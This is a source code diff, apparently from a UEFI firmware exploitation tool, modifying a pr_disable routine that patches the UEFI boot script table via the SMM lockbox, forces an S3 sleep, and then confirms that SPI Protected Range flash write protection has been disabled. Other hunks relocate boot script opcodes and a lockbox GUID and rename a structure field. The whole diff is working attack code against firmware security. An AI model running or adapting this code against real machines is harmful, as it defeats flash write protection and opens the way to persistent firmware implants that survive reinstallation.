@@ -43,13 +43,13 @@
 // default size for TSEG/HSEG
 #define SMRAM_SIZE 0x800000
 
-// Top of Memory
+// Top of Memory register address
 #define MEM_TOM PCI_ADDR(0, 0, 0, 0xa0)
 
-// Top of Low Usable DRAM
+// Top of Low Usable DRAM register address
 #define MEM_TOLUD PCI_ADDR(0, 0, 0, 0xbc)
 
-// Top of Upper Usable DRAM
+// Top of Upper Usable DRAM register address
 #define MEM_TOUUD PCI_ADDR(0, 0, 0, 0xa8)
 
 // Root Complex Base Address register address
@@ -58,12 +58,29 @@
 // SPI interface registers offset for RCRB
 #define SPIBAR 0x3800
 
-// SPI protected range registers offsets
+// SPI protected range registers offsets for RCRB
 #define PR0 SPIBAR + 0x74
 #define PR1 SPIBAR + 0x78
 #define PR2 SPIBAR + 0x7C
 #define PR3 SPIBAR + 0x80
 #define PR4 SPIBAR + 0x84
+
+// UEFI boot script table opcodes
+#define BOOT_SCRIPT_IO_WRITE_OPCODE                 0x00
+#define BOOT_SCRIPT_IO_READ_WRITE_OPCODE            0x01
+#define BOOT_SCRIPT_MEM_WRITE_OPCODE                0x02
+#define BOOT_SCRIPT_MEM_READ_WRITE_OPCODE           0x03
+#define BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE         0x04
+#define BOOT_SCRIPT_PCI_CONFIG_READ_WRITE_OPCODE    0x05
+#define BOOT_SCRIPT_SMBUS_EXECUTE_OPCODE            0x06
+#define BOOT_SCRIPT_STALL_OPCODE                    0x07
+#define BOOT_SCRIPT_DISPATCH_OPCODE                 0x08
+#define BOOT_SCRIPT_MEM_POLL_OPCODE                 0x09
+
+#define EFI_SMM_LOCK_BOX_COMMUNICATION_GUID \
+                {0x2a3cfebd, 0x27e8, 0x4d0a, {0x8b, 0x79, 0xd6, 0x88, 0xc2, 0xa3, 0xe1, 0xc0}}
+
+static GUID gEfiSmmLockBoxCommunicationGuid[] = EFI_SMM_LOCK_BOX_COMMUNICATION_GUID;
 
 typedef void (* SMM_PROC)(void);
 
@@ -1596,15 +1613,10 @@ unsigned long long configuration_table_addr(int target, PUEFI_EXPL_TARGET custom
 // "LOCKB_64" magic constant
 #define SMM_LOCK_BOX_SIGNATURE_64 0x34365F424B434F4C
 
-#define EFI_SMM_LOCK_BOX_COMMUNICATION_GUID \
-    {0x2a3cfebd, 0x27e8, 0x4d0a, {0x8b, 0x79, 0xd6, 0x88, 0xc2, 0xa3, 0xe1, 0xc0}}
-
-GUID gEfiSmmLockBoxCommunicationGuid[] = EFI_SMM_LOCK_BOX_COMMUNICATION_GUID;
-
 typedef struct
 {
     unsigned long long Signature;
-    LIST_ENTRY *Link;
+    LIST_ENTRY *Head;
 
 } SMM_LOCK_BOX_DATA;
 
@@ -1662,7 +1674,7 @@ int boot_script_table_addr(
         return -1;
     }
 
-    if (!IS_SMRAM_PTR(lockbox.Link))
+    if (!IS_SMRAM_PTR(lockbox.Head))
     {
         printf(__FUNCTION__"() ERROR: Invalid Link value\n");
         return -1;
@@ -1672,7 +1684,7 @@ int boot_script_table_addr(
 
     // read SMM lockbox LIST_ENTRY
     if (phys_mem_read(
-        target, custom_target, (void *)lockbox.Link,
+        target, custom_target, (void *)lockbox.Head,
         sizeof(LIST_ENTRY), (unsigned char *)&list_entry, NULL) != 0)
     {
         printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
@@ -1788,18 +1800,6 @@ int pr_get(
     return 0;
 }
 //--------------------------------------------------------------------------------------
-// boot script table opcodes
-#define BOOT_SCRIPT_IO_WRITE_OPCODE                 0x00
-#define BOOT_SCRIPT_IO_READ_WRITE_OPCODE            0x01
-#define BOOT_SCRIPT_MEM_WRITE_OPCODE                0x02
-#define BOOT_SCRIPT_MEM_READ_WRITE_OPCODE           0x03
-#define BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE         0x04
-#define BOOT_SCRIPT_PCI_CONFIG_READ_WRITE_OPCODE    0x05
-#define BOOT_SCRIPT_SMBUS_EXECUTE_OPCODE            0x06
-#define BOOT_SCRIPT_STALL_OPCODE                    0x07
-#define BOOT_SCRIPT_DISPATCH_OPCODE                 0x08
-#define BOOT_SCRIPT_MEM_POLL_OPCODE                 0x09
-
 int pr_disable(int target, PUEFI_EXPL_TARGET custom_target)
 {
     int ret = -1;
@@ -1944,9 +1944,30 @@ int pr_disable(int target, PUEFI_EXPL_TARGET custom_target)
 
     if (registers_found > 0)
     {
-        printf("%d UEFI boot script table entries was patched\n", entries_patched);
+        printf("%d UEFI boot script table entries was patched\n", entries_patched);        
 
-        ret = 0;
+        // go to the S3 sleep
+        if (s3_sleep_with_timeout(10) == 0)
+        {
+            // get current values of PRx registers
+            if (pr_get(target, custom_target, &pr0_val, &pr1_val, &pr2_val, &pr3_val, &pr4_val) != 0)
+            {
+                printf(__FUNCTION__"() ERROR: pr_get() fails\n");
+                goto _end;
+            }
+
+            // check if any protected ranges are set
+            if (pr0_val == 0 && pr1_val == 0 && pr2_val == 0 && pr3_val == 0 && pr4_val == 0)
+            {
+                printf("SPI Protected Ranges flash write protection was successfully disabled\n");
+
+                ret = 0;
+            }
+        }              
+        else
+        {
+            printf(__FUNCTION__"() ERROR: Unbale to put machine into the S3 sleep\n");
+        }
     }
     else
     {
